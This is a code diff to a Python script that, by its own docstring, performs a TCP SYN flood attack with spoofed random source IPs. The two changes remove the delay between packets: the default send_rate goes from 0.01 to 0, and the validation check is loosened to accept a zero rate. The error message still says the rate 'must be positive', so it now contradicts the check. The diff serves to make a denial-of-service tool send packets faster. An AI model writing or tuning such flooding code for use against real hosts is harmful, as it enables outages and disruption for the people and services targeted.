@@ -9,7 +9,7 @@ def random_ip():
     """Generates a random IP address."""
     return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
 
-def syn_flood(target_ip, target_port, num_packets, spoof_ip=True, send_rate=0.01):
+def syn_flood(target_ip, target_port, num_packets, spoof_ip=True, send_rate=0):
     """
     Performs a TCP SYN Flood attack.
 
@@ -69,7 +69,7 @@ if __name__ == "__main__":
         print("[!] Error: Number of packets must be positive.")
         sys.exit(1)
         
-    if args.rate <= 0:
+    if args.rate < 0:
         print("[!] Error: Send rate (interval) must be positive.")
         sys.exit(1)
 
